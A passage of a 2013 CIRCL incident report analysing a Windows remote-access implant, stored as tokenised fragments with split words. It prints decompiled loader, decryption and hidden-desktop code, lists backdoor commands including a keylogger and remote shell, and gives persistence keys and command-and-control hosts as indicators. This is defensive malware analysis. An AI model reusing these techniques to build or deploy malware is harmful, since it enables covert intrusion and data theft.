"Sleep", "(", "0xFFFFFFFF", ")", ";", "20", "result", "=", "0", ";", "21", "}"], ["22", "else", "23", "{", "24", "r", "e", "s", "u", "l", "t", "=", "GetLastError", "(", ")", ";", "Page", "8", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "25", "}", "26", "}", "27", "return", "r", "e", "s", "u", "l", "t", ";", "28", "}", "The", "code", "retrieves", "the", "\ufb01lename", "of", "itself", "(", "line", "3", ")", ",", "which", "is", "McUtil", ".", "DLL", ",", "and", "appends", ".PPT"], ["(", "line", "4", ")", "."], ["A", "handle", "to", "the", "\ufb01lename", "McUtil", ".", "DLL.PPT", "is", "created", "in", "line", "5", "."], ["In", "line", "12", "an", "exectuable", "memory", "region", "is", "created", ",", "which", "is", "\ufb01lled", "with", "the", "content", "of", "the", "\ufb01le", "McUtil", ".", "DLL.PPT", "(", "line", "13", ")", "."], ["After", "closing", "the", "handle", "to", "the", "\ufb01le", "(", "line", "15", ")", ",", "the", "memory", "region", "is", "called", "(", "line", "16", ")", "."], ["The", "next", "screenshot", "shows", "that", "the", "memory", "contains", "only", "pure", "code", "without", "any", "overhead", "like", "MZ", "/", "PE", "headers", "."], ["The", "entropy", "of", "this", "\ufb01le", "is", "7.997904", "bits", "per", "byte", ":", "The", "code", ",", "when", "executed", ",", "reveals", "the", "\ufb01rst", "hint", "about", "what", "we", "found", ":", "It", "decompresses", "and", "decrypts", "itself", ",", "using", "the", "Microsoft", "API", "call", "RtlDecompressBu\ufb00er", "and", "the", "custom", "decryption", "routine", ":", "Page", "9", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "1", "i", "n", "t", "crypt", "(", "unsigned", "i", "n", "t", "a1", ",", "i", "n", "t", "a2", ",", "i", "n", "t", "a3", ",", "i", "n", "t", "a4", ")"], ["2", "{", "3", "if", "(", "a4", ">", "0", ")"], ["4", "{", "5", "v10", "=", "a3", "\u2212", "a2", ";", "6", "do", "7", "{", "8", "a1", "=", "a1", "+", "(", "a1", ">", ">", "3", ")", "\u2212", "0x11111111", ";", "9", "a1", "=", "a1", "+", "(", "a1", ">", ">", "5", ")"], ["\u2212", "0x22222222", ";", "10"], ["a1", "+", "=", "0x44444444", "\u2212", "(", "a1", "<", "<", "9", ")", ";", "11", "a1", "+", "=", "0x33333333", "\u2212", "(", "a1", "<", "<", "7", ")", ";", "12", "v7", "=", "*", "(", "v10", "+", "a2++", ")", "^"], ["(", "a1", "+", "a1", "+", "a1", "+", "a1", ")", ";", "13", "v8", "=", "a4\u2212\u2212", "=", "=", "1", ";", "14", "*", "(", "a2", "\u2212", "1", ")", "=", "v7", ";", "15", "}", "16"], ["while", "(", "!"], ["v8", ")", ";"], ["17", "}", "18", "return", "0", ";", "19", "}", "The", "decrypted", "and", "decompressed", "\ufb01le", "is", "not", "written", "onto", "disk", ",", "it", "always", "remains", "in", "memory", "."], ["Sample", "E", "is", "the", "extracted", "version", "of", "this", "memory", "segment", "."], ["At", "this", "point", "it", "can", "be", "mentioned", "that", "neither", "the", "encrypted", "Sample", "D", "nor", "the", "decrypted", "memory", "segment", "Sample", "E", "are", "detected", "by", "Virus", "scanners", "."], ["After", "some", "initialisation", "work", "like", "adjusting", "tokens", "(", "SeDebugPrivilege", ",", "SeTcbPrivileg6", ",", "to", "act", "as", "part", "of", "the", "operating", "system", ")", ",", "a", "new", "process", "is", "started", ",", "the", "original", "svchost.exe", "from", "Microsoft", ",", "and", "the", "code", "from", "Sample", "E", "is", "injected", "into", "the", "memory", "of", "that", "process", "."], ["In", "a", "next", "step", ",", "svchost.exe", "is", "instructed", "to", "execute", "the", "original", "msiexec.exe", "from", "Microsoft", ",", "where", "also", "memory", "is", "injected", "like", "it", "has", "been", "done", "for", "svchost.exe", "."], ["Special", "conditions", "apply", "when", "run", "under", "Window", "7", ",", "which", "is", "protected", "by", "User", "Account", "Control", "(", "UAC", ")", "."], ["UAC", "is", "supposed", "to", "protect", "the", "user", "better", "from", "running", "malware", "by", "requesting", "the", "administator", "for", "approval", "before", "running", "a", "potentially", "dangerous", "application", "."], ["In", "the", "environment", "of", "Windows", "7", ",", "the", "malware", "drops", "temporarily", "\ufb01le", "Sample", "F", ",", "which", "it", "uses", "to", "evade", "or", "defeat", "the", "UAC", "mechanism", "."], ["After", "killing", "the", "parent", "processes", ",", "only", "two", "processes", "are", "left", ":", "svchost", "and", "msiexec", "."], ["Both", "are", "veri\ufb01ed", "binaries", ",", "none", "of", "the", "includes", "a", "malicious", "DLL", "."], ["Nevertheless", ",", "they", "both", "contain", "the", "malicious", "code", "."], ["At", "this", "point", "in", "time", "the", "malware", "is", "already", "talking", "to", "the", "C&C", ",", "no", "user", "interaction", "was", "required", ",", "all", "standard", "security", "mechanisms", "were", "defeated", "."], ["4.3", "Implemented", "commands", "The", "analysis", "of", "Sample", "B", "revealed", "the", "commands", "as", "shown", "in", "the", "table", "below", ":", "6", "http://technet.microsoft.com/en-us/library/bb457125.aspx", "Page", "10", "of", "21"], ["CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "Source", "\ufb01le", "XPlugOption.cpp", "XPlugDisk.cpp", "XPlugScreen.cpp", "XPlugProcess.cpp", "XPlugService.cpp", "XPlugShell.cpp", "XPlugTelnet.cpp", "XPlugRegedit.cpp", "XPlugNethood.cpp", "XPlugPortMap.cpp", "XPlugSQL.cpp", "XPlugNetstat.cpp", "XPlugKeyLogger.cpp", "Page", "11", "of", "21", "March", "29", ",", "2013", "Table", "1", ":", "Implemented", "commands"], ["Internal", "command", "subcommand", "Description"], ["0x2000", "lock", "workstation", "0x2001", "shutdown", "workstation", "(", "forced", ")"], ["Option", "0x2002", "reboot", "workstation", "0x2003", "shutdown", "workstation", "(", "graceful", ")"], ["0x2005", "show", "messagebox"], ["0x3000", "enumerate", "drives", "0x3001", "\ufb01nd", "\ufb01le", "0x3002"], ["\ufb01nd", "\ufb01le", "recursively", "0x300A", "create", "directory", "Disk", "0x3004", "read", "\ufb01le", "0x3007", "write"], ["\ufb01le", "0x300D", "\ufb01le", "copy", "/", "rename", "/", "delete", "/", "move"], ["0x300C", "create", "process", "on", "hidden", "desktop"], ["0x300E", "get", "expanded", "environment", "string"], ["0x4000"], ["Remote", "Desktop", "capabilities", "0x4004", "send", "mouse", "event"], ["Screen"], ["0x4005", "send", "keyboard", "event"], ["0x4006", "send", "CTRL", "-", "Alt", "-", "Delete", "0x4100", "take", "screenshot", "0x5000", "create", "process", "Process", "0x5001"], ["enumerate", "processes", "0x5002", "kill", "process", "0x6000", "query", "service", "con\ufb01g", "0x6001", "change", "service", "con\ufb01g", "(", "forced", ")"], ["Service", "0x6002", "start", "service", "0x6003", "control", "service", "0x6004", "delete", "service", "Shell", "0x7002", "start", "a", "cmd", "shell", "Telnet", "0x7100", "start", "telnet", "server", "0x9000", "enumerate", "keys", "0x9001", "create", "key", "0x9002", "delete", "key", "0x9003", "copy", "key", "RegEdit", "0x9004", "enumerate", "values"], ["0x9005", "set", "value", "0x9006", "delete", "value"], ["0x9007", "get", "value"], ["Nethood", "0xA000", "enumerate", "network", "resources"], ["Portmap", "0xB000", "starts", "port", "mapping", "0xC000"], ["get", "data", "source", "information"], ["SQL", "0xC001", "get", "driver", "description", "0xC002", "execute", "statement"], ["0xD000", "get"], ["TCP", "table", "Netstat", "0xD001", "get", "UDP", "table"], ["0xD002", "set", "TCP", "entry", "Keylogger", "0xE000", "starts", "key", "logger", "thread", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "4.4", "4.4.1", "March", "29", ",", "2013"], ["Command", "details"], ["Option", "XPlugOption", "implements", "commands", "to", "lock", "the", "workstation", ",", "shut", "it", "down", "or", "reboot", "it", "."], ["In", "addition", ",", "XPlugOption", "can", "create", "a", "thread", "that", "calls", "MessageBoxW", "(", ")", "in", "order", "to", "present", "a", "message", "box", "to", "the", "user", "."], ["4.4.2", "Disk", "XPlugDisk", "is", "used", "to", "enumerate", "connected", "disk", "drives", "and", "can", "be", "used", "to", "\ufb01nd", "and", "manipulate", "\ufb01les", "and", "directories", "."], ["In", "addition", ",", "XPlugDisk", "can", "be", "used", "to", "create", "a", "process", ",", "optionally", "on", "a", "hidden", "Windows", "desktop", "with", "the", "name", "\u201d", "HH", "\u201d", ",", "as", "the", "code", "below", "illustrates", ":", "1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "if", "(", "a1\u2212>hidden", ")", "{", "hDesktop", "=", "CreateDesktopW", "(", "L\"HH", "\"", ",", "0", ",", "0", ",", "0", ",", "0x10000000u", ",", "0", ")", ";", "if", "(", "!"], ["hDesktop", ")"], ["l", "o", "g", "(", "\"", "XPlugDisk.cpp", "\"", ",", "665", ",", "0", ")", ";", "}", "hidden"], ["=", "a1\u2212>hidden", ";"], ["S", "t", "a", "r", "t", "u", "p", "I", "n", "f", "o", "."], ["lpDesktop", "=", "(", "hidden", "!", "=", "0", "?"], ["L\"HH", "\"", ":", "0", ")", ";"], ["S", "t", "a", "r", "t", "u", "p", "I", "n", "f", "o", "."], ["cb", "=", "6", "8", ";"], ["S", "t", "a", "r", "t", "u", "p", "I", "n", "f", "o", "."], ["dwFlags", "=", "1", ";"], ["S", "t", "a", "r", "t", "u", "p", "I", "n", "f", "o", "."], ["wShowWindow", "=", "hidden", "=", "=", "0", ";", "if", "(", "CreateProcessW", "(", "0", ",", "&", "a1\u2212>commandline", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "0", ",", "&", "StartupInfo", ",", "&", "ProcessInformation", ")", ")"], ["{", "...", "}", "4.4.3", "Screen", "XPlugScreen", "is", "not", "only", "taking", "screenshots", ",", "it", "is", "also", "implementing", "remote", "desktop", "capabilities", "."], ["It", "is", "able", "to", "capture", "the", "screen", "(", "internal", "command", ":", "ScreenT1", ")", "and", "can", "send", "mouse", "and", "keyboard", "events", "(", "internal", "command", ":", "ScreenT2", ")", "."], ["4.4.4", "Process", "XPlugProcess", "implements", "three", "commands", "and", "is", "able", "to", "enumerate", ",", "create", "and", "kill", "processes", "."], ["4.4.5", "Service"], ["In", "the", "module", "XPlugService", "commands", "are", "available", "related", "to", "Windows", "services", "."], ["Code", "is", "implemented", "to", "query", "service", "con\ufb01gurations", ",", "change", "service", "con\ufb01guration", ",", "start", ",", "control", "and", "delete", "services", "."], ["4.4.6", "Shell", "A", "remote", "shell", "for", "the", "attacker", "is", "created", "in", "the", "module", "XPlugShell", ",", "by", "creating", "an", "asynchronous", "set", "of", "pipes", "(", "\\pipe\\a", "and", "\\pipe\\b", ")", "for", "cmd.exe", "and", "the", "console", "attached", "to", "it", "(", "AttachConsole", "(", ")", ")", "."], ["Page", "12", "of", "21"], ["CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "4.4.7", "March", "29", ",", "2013", "Telnet", "cmd.exe", "/Q", "is", "executed", "in", "the", "module", "XPlugTelnet", "in", "order", "to", "start", "a", "telnet", "server", "on", "the", "attacked", "machine", "."], ["4.4.8"], ["RegEdit", "XPlugRegedit", "implements", "a", "set", "of", "commands", "to", "process", "the", "Windows", "registry", "."], ["It", "is", "able", "to", "enumerate", ",", "create", ",", "delete", "and", "copy", "keys", "."], ["It", "is", "also", "able", "to", "enumerate", ",", "set", ",", "delete", "and", "get", "values", "from", "the", "registry", "."], ["4.4.9"], ["Nethood", "XPlugNethood", "is", "the", "module", "to", "enumerate", "network", "resources", "like", "network", "shares", "."], ["4.4.10", "Portmap", "XPlugPortMap", "indicates", "that", "it", "performs", "some", "port", "mapping", ",", "however", ",", "the", "code", "is", "not", "understood", ",", "yet", "."], ["4.4.11", "SQL", "XPlugSQL", "implements", "three", "functions", "to", "query", "SQL", "servers", ":", "a", "function", "to", "get", "data", "source", "information", ",", "a", "function", "to", "get", "the", "driver", "description", "and", "a", "function", "to", "execute", "SQL", "statements", "."], ["4.4.12", "Netstat", "XPlugNetstat", "gets", "the", "TCP", "and", "UDP", "connection", "table", "and", "is", "able", "to", "set", "TCP", "table", "entries", "."], ["4.4.13", "Keylogger"], ["The", "keylogger", "implemented", "in", "XPlugKeyLogger", "catches", "Window", "titles", ",", "date", ",", "time", "and", "logs", "entered", "keys", "into", "the", "\ufb01le", "1", "C", ":", "\\", "Documents", "and", "S", "e", "t", "t", "i", "n", "g", "s", "\\", "A", "l", "l", "Users", "\\VirusMap\\NvSmart", "."], ["hlp"], ["It", "has", "the", "format", "following", "the", "example", "below", ":", "1", "2", "3", "4", "5", "6", "7", "2013\u221203\u221226", "0", "9", ":", "4", "0", ":", "5", "7", "|", "C", ":", "\\", "Program", "F", "i", "l", "e", "s", "\\", "M", "o"], ["z", "i", "l", "l", "a", "F", "i", "r", "e", "f", "o", "x", "\\", "f", "i", "r", "e", "f", "o", "x", ".", "exe"], ["\u2212", "M", "o", "z", "i", "l", "l", "a", "F", "i", "r", "e", "f", "o", "x", "www", "."], ["g", "o", "o", "g", "l", "e", "."], ["com"], ["2013\u221203\u221226", "0", "9", ":", "4", "7", ":", "4", "9", "|", "C", ":", "\\WINDOWS\\system32\\notepad", "."], ["exe", "|", "U", "n", "t"], ["i", "t", "l", "e", "d", "\u2212", "Notepad"], ["This", "i", "s", "not", "a", "password"], ["2013\u221203\u221226", "0", "9", ":", "4", "8", ":", "0", "6", "|", "C", ":", "\\WINDOWS\\", "Explorer", ".EXE", "|", "C", ":", "\\", "Documents", "and", "S", "e", "t", "t", "i", "n", "g", "s", "\\", "A", "l", "l", "Users", "\\"], ["VirusMap", "4.5", "4.5.1", "Other", "notable", "commands", "and", "functions", "log"], ["This", "function", "is", "called", "almost", "everywhere", "when", "the", "author", "expects", "that", "a", "functions", "returns", "an", "error", ",", "at", "1036", "places", "."], ["This", "is", "obviously", "done", "to", "ensure", "code", "quality", "."], ["Page", "13", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg"], ["c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "March", "29", ",", "2013", "1", "write_log", "(", "LPCWSTR", "l", "p", "B", "u", "f"], ["f", "e", "r", ")"], ["2", "{", "3", "ExpandEnvironmentStringsW", "(", "L\"%ALLUSERSPROFILE%", "\"", ",", "&", "path_to_bug", ".", "log", ",", "0x800u", ")", ";", "4", "//", "%", "ALLUSERSPROFILE%\\SxS\\bug", "."], ["l", "o", "g", "5", "lstrcatW(&path_to_bug", "."], ["log", ",", "L\"\\\\SxS", "\"", ")", ";", "6", "CreateDirectoryW(&path_to_bug", ".", "log", ",", "0", ")", ";", "7", "SetFileAttributesW(&path_to_bug", ".", "log", ",", "6u", ")", ";", "8", "lstrcatW(&path_to_bug", "."], ["log", ",", "L\"\\\\bug.log", "\"", ")", ";", "9", "r", "e", "s", "u", "l", "t", "=", "CreateFileW(&path_to_bug", "."], ["log", ",", "0x40000000u", ",", "1u", ",", "0", ",", "4u", ",", "2u", ",", "0", ")", ";", "10", "if", "(", "r", "e", "s", "u", "l", "t", "!", "=", "\u22121", ")"], ["11", "{", "12"], ["if", "(", "S", "e", "t", "F", "i", "l", "e", "P", "o", "i", "n", "t", "e", "r", "(", "r", "e", "s", "u", "l", "t", ",", "0", ",", "0", ",", "2u", ")", "!", "=", "\u22121", ")", "13", "{", "14", "GetLocalTime(&SystemTime", ")", ";"], ["15", "NumberOfBytesWritten", "=", "wsprintfW", "(", "16", "&", "Buffer", ",", "17"], ["L\"%4.4d", "-%2.2d", "-%2.2d", "%", "2.2d:%2.2d:%2.2d", ":", "\"", ",", "18", "SystemTime", "."], ["wYear", ",", "19", "SystemTime", "."], ["wMonth", ",", "20", "SystemTime", "."], ["wDay", ",", "21", "SystemTime", "."], ["wHour", ","], ["22", "SystemTime", "."], ["wMinute", ",", "23", "SystemTime", "."], ["wSecond", ")", ";", "24"], ["if", "(", "WriteFile", "(", "r", "e", "s", "u", "l", "t", ",", "&", "Buffer", ",", "2", "*", "NumberOfBytesWritten", ",", "&", "NumberOfBytesWritten", ",", "0", ")", ")"], ["25", "{", "26", "l", "e", "n", "=", "lstrlenW", "(", "l", "p", "B", "u", "f", "f", "e", "r", ")", ";", "27", "WriteFile", "(", "r", "e", "s", "u", "l", "t", ",", "l", "p", "B", "u", "f", "f", "e", "r", ",", "2", "*", "len", ",", "&", "len", ",", "0", ")", ";", "28", "}", "29", "}", "30", "r", "e", "s", "u", "l", "t"], ["=", "CloseHandle", "(", "r", "e", "s", "u", "l", "t", ")", ";", "31", "}", "32", "return", "r", "e", "s", "u", "l", "t", ";", "33", "}", "Example", "log", "\ufb01le", "entries", "from", "\ufb01le", "1", "%", "ALLUSERSPROFILE%\\SxS\\bug", "."], ["l", "o", "g", "1", "2013\u221203\u221225", "1", "1", ":", "4", "3", ":", "2", "8", ":", "f", "i", "l", "e", ":", "XSetting", "."], ["h", ",", "l", "i", "n", "e", ":", "57", ",", "e", "r", "r", "o", "r", ":", "[", "1", "3", "0", "0", "]", "Not", "a", "l", "l", "p", "r", "i", "v", "i", "l", "e", "g", "e", "s", "r", "e", "f", "e", "r", "e", "n", "c", "e", "d", "are", "a", "s", "s", "i", "g", "n", "e", "d", "to", "the", "c", "a", "l", "l", "e", "r", "."], ["2", "2013\u221203\u221225", "1", "1", ":", "5", "1", ":", "1", "2", ":", "f", "i", "l", "e", ":", "XInstallUAC", "."], ["cpp", ",", "l", "i", "n", "e", ":", "162", ",", "e", "r", "r", "o", "r", ":", "[", "5", "]", "Access", "i", "s", "denied", "."], ["3", "2013\u221203\u221225", "1", "3", ":", "5", "9", ":", "4", "5", ":", "f", "i", "l", "e", ":", "XRTL", ".", "cpp", ",", "l", "i", "n", "e", ":", "186", ",", "e", "r", "r", "o", "r", ":", "[", "1", "3", "0", "0", "]", "Not", "a", "l", "l", "p", "r", "i", "v", "i", "l", "e", "g", "e", "s", "r", "e", "f", "e", "r", "e", "n", "c", "e", "d", "are", "a", "s", "s", "i", "g", "n", "e", "d", "to", "the", "c", "a", "l", "l", "e", "r", "."], ["4", "2013\u221203\u221225", "1", "4", ":", "0", "7", ":", "1", "2", ":", "f", "i", "l", "e", ":", "XRTL", ".", "cpp", ",", "l", "i", "n", "e", ":", "186", ",", "e", "r", "r", "o", "r", ":", "[", "1", "2", "3", "]", "The", "filename", ",", "d", "i", "r", "e", "c", "t", "o", "r", "y", "name", ",", "or", "volume", "l", "a", "b", "e", "l", "syntax"], ["i", "s", "i", "n", "c", "o", "r", "r", "e", "c", "t", "."], ["5", "2013\u221203\u221225", "1", "4", ":", "0", "7", ":", "1", "2", ":", "f", "i", "l", "e", ":"], ["XSetting", "."], ["h", ",", "l", "i", "n", "e", ":", "58", ",", "e", "r", "r", "o", "r", ":", "[", "3", "]", "The", "system", "can", "not", "f", "i", "n", "d", "the", "path", "s", "p", "e", "c", "i", "f", "i", "e", "d", "."], ["6", "2013\u221203\u221225", "1", "4", ":", "2", "1", ":", "1", "2", ":", "f", "i", "l", "e", ":", "dllmain", ".", "cpp", ",", "l", "i", "n", "e", ":", "47", ",", "e", "r", "r", "o", "r", ":", "[", "1", "3", "0", "0", "]", "Not", "a", "l", "l", "p", "r", "i", "v", "i", "l", "e", "g", "e", "s", "r", "e", "f", "e", "r", "e", "n", "c", "e", "d", "are", "a", "s", "s", "i", "g", "n", "e", "d", "to", "the", "c", "a", "l", "l", "e", "r", "."], ["7", "2013\u221203\u221225", "1", "7", ":", "3", "1", ":", "5", "8", ":", "f", "i", "l"], ["e", ":", "X", "I", "n", "s", "t", "a", "l", "l", ".", "cpp", ",", "l", "i", "n", "e", ":", "451", ",", "e", "r", "r", "o", "r", ":", "[", "5", "]", "Access", "i", "s", "denied", "."], ["8", "2013\u221203\u221225", "1", "7", ":", "3", "7", ":", "0", "0", ":"], ["f", "i", "l", "e", ":", "XSoTcpHttp", ".", "cpp", ",", "l", "i", "n", "e", ":", "646", ",", "e", "r", "r", "o", "r", ":", "[", "1", "2", "0", "2", "9", "]", "*", "In", "addition", "an", "exception", "\ufb01lter", "is", "installed", "to", "fetch", "the", "circumstances", "of", "otherwise", "not", "caught", "errors", ":"], ["1", "TopLevelExceptionFilter", "(", "struct_a1_30", "*", "a1", ")"], ["2", "{", "3", "..."], ["4", "if", "(", "wsprintfA", "(", "5", "&", "OutputString", ",", "Page", "14", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE"], ["41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"], ["17", "18", "19", "20", "21", "22", "23", "March", "29", ",", "2013", "\"", "EName", ":", "%", "s", ",", "EAddr", ":", "0x%p", ",", "ECode", ":", "0x%p", ",", "EAX:%p", ",", "EBX:%p", ",", "ECX:%p", ",", "EDX:%p", ",", "ESI:%p", ",", "EDI:%p", ",", "EBP", ":", "%", "p", ",", "ESP:%p", ",", "EIP:%p\\r\\n", "\"", ",", "&", "String1", ",", "a1\u2212>ECode"], ["[", "3", "]", ",", "*", "a1\u2212>ECode", ",", "v6\u2212>reg_eax", ","], ["v6\u2212>reg_ebx", ",", "v6\u2212>reg_ecx", ",", "v6\u2212>reg_edx", ",", "v6\u2212>reg_esi", ",", "v6\u2212>reg_edi", ",", "v6\u2212>reg_ebp", ",", "v6\u2212>reg_esp", ",", "v6\u2212>reg_eip", ")", ">", "=", "256", ")"], ["l", "o", "g", "(", "\"", "XException.cpp", "\"", ",", "39", ",", "0", ")", ";", "ca", "ll_wr", "it", "e_l", "og(&OutputString", ")", ";", "call_OutputDebugStringA(&OutputString", ")", ";", "..."], ["}", "4.6", "Persistency", "The", "three", "\ufb01les", "Sample", "B", ",", "C", "and", "D", "are", "copied", "into", "the", "directory", "1", "C", ":", "\\", "Documents", "and", "S", "e", "t", "t", "i", "n", "g", "s", "\\", "A", "l", "l", "Users", "\\VirusMap", "respectively", "in", "1", "C", ":", "\\", "ProgramData\\VirusMap", "(", "C", ":", "\\", "Users", "\\"], ["A", "l", "l", "Users", "\\VirusMap", ")"], ["After", "that", ",", "a", "new", "registry", "entry", "is", "set", ":", "1", "HKEY_CURRENT_USER\\", "Software", "\\", "M", "i", "c", "r", "o", "s", "o", "f", "t", "\\Windows\\", "CurrentVersion", "\\Run", "which", "calls", "mcvsmap.exe", "(", "Sample", "B", ")", "after", "login", "."], ["Another", "option", "is", "the", "installation", "as", "a", "service", "in", "1", "HKEY_LOCAL_MACHINE\\SYSTEM\\", "ControlSet001", "\\", "S", "e", "r", "v", "i", "c", "e", "s", "\\VirusMap", "The", "key", "\u201d", "Imagepath", "\u201d", "calls", "the", "same", "binary", "mcvsmap.exe", "(", "Sample", "B", ")", "."], ["4.7", "Control"], ["The", "attacked", "computer", "uses", "TCP", "and", "UDP", "to", "connect", "to", "port", "443", "on", "help.yahoo-upgrade.com"], ["(", "122.199.194.197", ")", "."], ["Unfortunately", ",", "the", "machine", "at", "that", "IP", "address", "does", "n\u2019t", "seem", "to", "reply", "to", "our", "requests", "anymore", "on", "2013", "-", "03", "-", "26", "."], ["The", "Passive", "DNS", "showed", "some", "other", "associated", "domains", "and", "hostnames", "with", "this", "IP", "address", ":", "1", "2", "3", "4", "5", "help", ".", "yahoo\u2212upgrade", ".", "com", "support", ".", "yahoo\u2212upgrade", ".", "com", "update", ".", "ayuisyahooapis", ".", "com", "support", ".", "ayuisyahooapis", ".", "com", "update", ".", "t", "r", "e", "n", "d", "m", "i", "c", "r", "o", "s", "o", "f", "t", ".", "co", ".", "i", "n", "It", "\u2019s", "highly", "probable", "that", "these", "s", "hostnames", "were", "also", "used", "for", "other", "campaigns", "."], ["You", "might", "use", "these", "as", "additional", "indicators", "for", "the", "detection", "of", "potential", "infections", "."], ["Page", "15", "of", "21"], ["CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d", "GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", "www.circl.lu", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "4.8", "4.8.1", "March", "29", ",", "2013", "Network", "and", "domain", "information"], ["Network", "The", "IP", "address", "is", "located", "in", "the", "ASN", "17877", "and", "the", "ISP", "is", "not", "a", "known", "bulletproof", "hoster", "as", "you", "can", "see", "on", "its", "historical7", "BGP", "ranking", "evolution", "."], ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", "16"], ["17", "18", "19", "20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "inetnum", ":", "netname", ":", "descr", ":", "descr", ":", "descr", ":", "descr", ":", "descr", ":", "descr", ":", "descr", ":", "descr", ":", "descr", ":", "country", ":", "admin\u2212c", ":", "tech\u2212c", ":", "remarks", ":", "status", ":", "mnt\u2212by", ":", "mnt\u2212lower", ":", "changed", ":", "source", ":", "122.199.128.0", "\u2212", "122.199.255.255", "VAAN", "NexG", "5F", "SeoulAcademy", "B", "/", "D", ",", "967\u22126", "Daechi\u2212Dong", ",", "Gangnam\u2212Gu", ",", "135\u2212280", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*"], ["*"], ["All", "o", "c", "at", "ed", "to", "KRNIC", "Member", "."], ["I", "f", "you", "would", "l", "i", "k", "e", "to", "f", "i", "n", "d", "assignment"], ["i", "nform", "ation", "i", "n", "d", "e", "t", "a", "i", "l", "p", "l", "e", "a", "s", "e", "r", "e", "f", "e", "r", "to", "the", "KRNIC", "Whois", "Database", "at", ":", "\"", "http", ":", "//", "whois.nic.or.kr/english/index.html", "\"", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "*", "KR"], ["SL1625\u2212AP", "SL1625\u2212AP", "www", "."], ["nexg", "."], ["net", "ALLOCATED", "PORTABLE", "MNT\u2212KRNIC\u2212AP", "MNT\u2212KRNIC\u2212AP", "hm\u2212changed@apnic", "."], ["net", "20060606"], ["APNIC", "person", ":"], ["nic\u2212hdl", ":", "e\u2212mail", ":", "address", ":", "phone", ":", "fax\u2212no", ":", "country", ":", "changed", ":", "Sanguk", "Lee"], ["SL1625\u2212AP", "ip@nexg", ".", "net", "5F", "SeoulAcademy", "B", "/", "D", ",", "967\u22126", "Daechi\u2212Dong", ",", "Gangnam\u2212Gu", ",", "135\u2212280"], ["+82\u22122\u2212538\u22127060"], ["+82\u22122\u2212571\u22128998", "KR", "hostmaster@nida", "."], ["or", "."], ["kr", "20050105", "7", "http://bgpranking.circl.lu/asn_details?asn=17877", "Page", "16", "of", "21", "CIRCL", "-", "Computer", "Incident", "Response", "Center", "Luxembourg", "c", "/", "o", "smile", "-", "\u201d", "security", "made", "in", "L\u00ebtzebuerg", "\u201d"], ["GIE", "41", ",", "avenue", "de", "la", "gare", ",", "L-1611", "Luxembourg", "(", "+352", ")", "247", "88444", "-", "info@circl.lu", "\u2013", 